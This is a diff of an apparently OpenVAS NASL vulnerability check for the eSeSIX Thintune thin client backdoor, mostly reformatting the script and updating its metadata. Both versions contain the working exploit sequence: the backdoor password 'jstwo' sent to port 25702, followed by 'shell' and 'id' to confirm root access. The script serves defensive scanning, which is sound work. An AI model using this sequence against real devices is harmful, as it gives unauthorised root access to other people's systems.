@@ -22,79 +22,67 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 #
 
-tag_summary = "Thintune is a series of thin client appliances sold by eSeSIX GmbH, Germany.
-They offer ICA, RDP, X11 and SSH support based on a customized Linux
-platform.
-
-Multiple security vulnerabilities have been found, one of them is a backdoor
-password ('jstwo') allowing complete access to the system.";
-
-# From: "Loss, Dirk" <Dirk.Loss@it-consult.net>
-# Subject: eSeSIX Thintune thin client multiple vulnerabilities
-# Date: 24.7.2004 10:54
-
 if(description)
 {
- script_oid("1.3.6.1.4.1.25623.1.0.13839");
- script_version("$Revision: 9348 $");
- script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
- script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
- script_cve_id("CVE-2004-2048", "CVE-2004-2049", "CVE-2004-2050", "CVE-2004-2051");
- script_bugtraq_id(10794);
- script_tag(name:"cvss_base", value:"10.0");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
- name = "eSeSIX Thintune Thin Client Multiple Vulnerabilities";
- 
- script_name(name);
- 
+  script_oid("1.3.6.1.4.1.25623.1.0.13839");
+  script_version("2019-04-11T14:06:24+0000");
+  script_tag(name:"last_modification", value:"2019-04-11 14:06:24 +0000 (Thu, 11 Apr 2019)");
+  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
+  script_cve_id("CVE-2004-2048", "CVE-2004-2049", "CVE-2004-2050", "CVE-2004-2051");
+  script_bugtraq_id(10794);
+  script_tag(name:"cvss_base", value:"10.0");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
+  script_name("eSeSIX Thintune Thin Client Multiple Vulnerabilities");
+  script_category(ACT_GATHER_INFO);
+  script_copyright("This script is Copyright (C) 2004 Noam Rathaus");
+  script_family("General");
+  script_dependencies("find_service2.nasl");
+  script_require_ports("Services/unknown", 25702);
 
- 
- 
- script_category(ACT_GATHER_INFO);
+  script_tag(name:"summary", value:"Multiple security vulnerabilities have been found in Thintune,
+  one of them is a backdoor password ('jstwo') allowing complete access to the system.");
+
+  script_tag(name:"solution", value:"No known solution was made available for at least one year
+  since the disclosure of this vulnerability. Likely none will be provided anymore.
+  General solution options are to upgrade to a newer release, disable respective features,
+  remove the product or replace the product by another one.");
+
   script_tag(name:"qod_type", value:"remote_vul");
- 
- script_copyright("This script is Copyright (C) 2004 Noam Rathaus");
+  script_tag(name:"solution_type", value:"WillNotFix");
 
- script_family("General");
- script_dependencies("find_service2.nasl");
- script_require_ports("Services/unknown", 25702);
- script_tag(name : "summary" , value : tag_summary);
- exit(0);
+  exit(0);
 }
 
 port = 25702;
-if(get_port_state(port))
-{
- soc = open_sock_tcp(port);
- if(soc)
- {
-  res = recv_line(socket:soc, length: 1024);
-  if ("JSRAFV-1" >< res)
-  {
-   req = "jstwo\n";
-   send(socket:soc, data:req);
+if(!get_port_state(port))
+  exit(0);
 
-   res = recv_line(socket:soc, length:1024);
-   if ("+yep" >< res)
-   {
+soc = open_sock_tcp(port);
+if(!soc)
+  exit(0);
+
+res = recv_line(socket:soc, length: 1024);
+if ("JSRAFV-1" >< res) {
+  req = "jstwo\n";
+  send(socket:soc, data:req);
+
+  res = recv_line(socket:soc, length:1024);
+  if ("+yep" >< res) {
     req = "shell\n";
     send(socket:soc, data:req);
 
     res = recv_line(socket:soc, length:1024);
-    if ("+yep here you are" >< res)
-    {
-     req = "id\n";
-     send(socket:soc, data:req);
+    if ("+yep here you are" >< res) {
+      req = "id\n";
+      send(socket:soc, data:req);
 
-     res = recv(socket:soc, length:1024);
-     if ("uid=0" >< res)
-     {
-      security_message(port:port);
-     }
+      res = recv(socket:soc, length:1024);
+      if ("uid=0" >< res) {
+        security_message(port:port);
+      }
     }
-   }
   }
-  close(soc);
- }
 }
 
+close(soc);
+exit(0);
